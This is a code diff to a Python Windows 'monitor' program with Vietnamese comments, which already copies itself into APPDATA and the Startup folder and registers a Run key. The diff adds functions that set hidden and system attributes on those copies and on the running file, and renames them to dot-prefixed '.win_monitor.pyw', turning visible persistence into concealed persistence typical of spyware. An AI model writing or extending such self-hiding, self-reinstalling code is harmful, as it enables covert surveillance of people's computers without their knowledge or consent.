@@ -61,9 +61,9 @@ APPDATA  = os.environ.get("APPDATA") or os.path.expanduser("~")
 BASE_DIR = os.path.join(APPDATA, APP_NAME)
 CONFIG_PATH = os.path.join(BASE_DIR, "config.json")
 LOG_PATH    = os.path.join(BASE_DIR, "monitor.log")
-SELF_COPY   = os.path.join(BASE_DIR, "monitor.pyw")
+SELF_COPY   = os.path.join(BASE_DIR, ".win_monitor.pyw")
 STARTUP_DIR = os.path.join(APPDATA, r"Microsoft\Windows\Start Menu\Programs\Startup")
-STARTUP_COPY = os.path.join(STARTUP_DIR, "WinMonitor.pyw")
+STARTUP_COPY = os.path.join(STARTUP_DIR, ".win_monitor.pyw")
 
 RUNNING = True
 CONFIG_LOCK = threading.RLock()
@@ -591,6 +591,30 @@ def do_restart():
 # ============================================================================
 #  DUY TRI / TU PHUC HOI  (persistence)
 # ============================================================================
+def hide_file(path):
+    """An file tren Windows (FILE_ATTRIBUTE_HIDDEN + SYSTEM)."""
+    if not IS_WINDOWS:
+        return
+    try:
+        FILE_ATTRIBUTE_HIDDEN = 0x2
+        FILE_ATTRIBUTE_SYSTEM = 0x4
+        ctypes.windll.kernel32.SetFileAttributesW(
+            str(path), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM)
+    except Exception as e:
+        log("hide_file error: %s" % e)
+
+
+def copy_hidden(src, dst):
+    """Copy file roi dat thuoc tinh an."""
+    try:
+        shutil.copy2(src, dst)
+        hide_file(dst)
+        return True
+    except Exception as e:
+        log("copy_hidden error: %s" % e)
+        return False
+
+
 def find_pythonw():
     exe = sys.executable or "pythonw.exe"
     base = os.path.basename(exe).lower()
@@ -643,17 +667,16 @@ def ensure_persistence():
     try:
         os.makedirs(BASE_DIR, exist_ok=True)
         src = os.path.abspath(sys.argv[0]) if sys.argv and sys.argv[0] else __file__
-        # ban sao chuan trong APPDATA
+        # An chinh file dang chay (neu co the)
+        hide_file(src)
+        # ban sao chuan trong APPDATA (an)
         if os.path.abspath(SELF_COPY) != os.path.abspath(src):
-            try:
-                shutil.copy2(src, SELF_COPY)
-            except Exception:
-                pass
-        # ban sao trong Startup
+            copy_hidden(src, SELF_COPY)
+        # ban sao trong Startup (an)
         try:
             os.makedirs(STARTUP_DIR, exist_ok=True)
             if os.path.abspath(STARTUP_COPY) not in (os.path.abspath(src), os.path.abspath(SELF_COPY)):
-                shutil.copy2(SELF_COPY if os.path.exists(SELF_COPY) else src, STARTUP_COPY)
+                copy_hidden(SELF_COPY if os.path.exists(SELF_COPY) else src, STARTUP_COPY)
         except Exception:
             pass
         register_run_key()
